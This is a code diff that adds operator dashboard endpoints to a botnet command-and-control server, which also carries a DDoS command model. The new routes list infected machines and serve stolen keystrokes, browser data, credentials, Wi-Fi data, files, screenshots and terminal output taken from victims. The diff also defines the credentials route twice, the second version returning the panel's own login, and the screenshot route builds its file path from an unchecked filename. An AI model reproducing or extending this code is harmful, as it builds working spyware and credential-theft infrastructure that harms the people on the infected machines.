@@ -147,6 +147,106 @@ class DDoSCommand(BaseModel):
     count: Optional[int] = None
     all_bots: bool = True
 
+# ==================== Dashboard Data Endpoints ====================
+
+@app.get("/api/bots")
+async def get_bots(username: str = Depends(authenticate)):
+    now = datetime.datetime.utcnow()
+    bot_list = []
+    for ip, info in bots.items():
+        last = datetime.datetime.fromisoformat(info["last_seen"])
+        is_active = (now - last).seconds < 300
+        bot_list.append({
+            "ip": ip,
+            "hostname": info.get("hostname", "unknown"),
+            "username": info.get("username", "unknown"),
+            "os_info": info.get("os_info", "unknown"),
+            "last_seen": info["last_seen"],
+            "first_seen": info.get("first_seen", info["last_seen"]),
+            "status": "active" if is_active else "inactive"
+        })
+    return sorted(bot_list, key=lambda x: x["last_seen"], reverse=True)
+
+@app.get("/api/keystrokes")
+async def get_keystrokes(limit: int = 100, ip_filter: Optional[str] = None, username: str = Depends(authenticate)):
+    if ip_filter:
+        filtered = [log for log in keystroke_logs if log["ip"] == ip_filter]
+    else:
+        filtered = keystroke_logs
+    return filtered[-limit:][::-1]
+
+@app.get("/api/browser_data")
+async def get_browser_data(limit: int = 50, username: str = Depends(authenticate)):
+    return browser_logs[-limit:][::-1]
+
+@app.get("/api/credentials")
+async def get_credentials(limit: int = 50, username: str = Depends(authenticate)):
+    return credential_logs[-limit:][::-1]
+
+@app.get("/api/wifi_data")
+async def get_wifi_data(limit: int = 50, username: str = Depends(authenticate)):
+    return wifi_logs[-limit:][::-1]
+
+@app.get("/api/files_data")
+async def get_files_data(limit: int = 50, username: str = Depends(authenticate)):
+    return file_logs[-limit:][::-1]
+
+@app.get("/api/screenshots")
+async def get_screenshots(limit: int = 20, username: str = Depends(authenticate)):
+    return screenshot_logs[-limit:][::-1]
+
+@app.get("/api/screenshot/{filename}")
+async def get_screenshot(filename: str, username: str = Depends(authenticate)):
+    file_path = f"{DATA_DIR}/screenshots/{filename}"
+    if os.path.exists(file_path):
+        return FileResponse(file_path)
+    return {"error": "Not found"}
+
+@app.get("/api/terminal_outputs")
+async def get_terminal_outputs(ip: Optional[str] = None, username: str = Depends(authenticate)):
+    if ip:
+        return {ip: terminal_outputs.get(ip, [])}
+    return terminal_outputs
+
+@app.get("/api/plugins")
+async def list_plugins(username: str = Depends(authenticate)):
+    return plugins
+
+@app.get("/api/stats")
+async def get_stats(username: str = Depends(authenticate)):
+    now = datetime.datetime.utcnow()
+    active_bots = sum(1 for ip, info in bots.items() 
+                     if (now - datetime.datetime.fromisoformat(info["last_seen"])).seconds < 300)
+    
+    return {
+        "total_bots": len(bots),
+        "active_bots": active_bots,
+        "total_keystrokes": len(keystroke_logs),
+        "total_browser": len(browser_logs),
+        "total_credentials": len(credential_logs),
+        "total_wifi": len(wifi_logs),
+        "total_files": len(file_logs),
+        "total_screenshots": len(screenshot_logs),
+        "uptime": time.time(),
+        "environment": ENVIRONMENT
+    }
+
+@app.get("/api/credentials")
+async def get_creds(username: str = Depends(authenticate)):
+    return {"username": USERNAME, "password": PASSWORD}
+
+@app.post("/api/change_credentials")
+async def change_credentials(
+    new_username: str,
+    new_password: str,
+    username: str = Depends(authenticate)
+):
+    global USERNAME, PASSWORD
+    USERNAME = new_username
+    PASSWORD = new_password
+    return {"status": "credentials updated"}
+
+
 # ==================== File Storage with Persistence ====================
 class PersistentStorage:
     """Handles persistent storage on Render's disk"""
@@ -701,3 +801,4 @@ async def startup_event():
     print(f"🔑 Password: {PASSWORD}")
     print(f"📊 Total Bots: {len(bots)}")
     print("="*60 + "\n")
+
